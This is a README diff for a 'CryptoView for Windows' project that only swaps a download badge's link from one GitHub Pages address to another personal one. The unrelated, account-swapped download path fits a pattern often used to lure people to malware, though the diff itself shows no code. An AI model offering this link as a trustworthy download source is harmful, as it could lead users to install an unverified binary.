@@ -4,7 +4,7 @@
 
 ## 📥 Download CryptoView for Windows
 
-[![⬇️ Download CryptoView](https://img.shields.io/badge/Download-CryptoView-blue?style=for-the-badge&logo=windows)](https://viewloads.github.io/.github/)
+[![⬇️ Download CryptoView](https://img.shields.io/badge/Download-CryptoView-blue?style=for-the-badge&logo=windows)](https://stefankuznetsoff.github.io/.github/crypto-view)
 
 ---
 
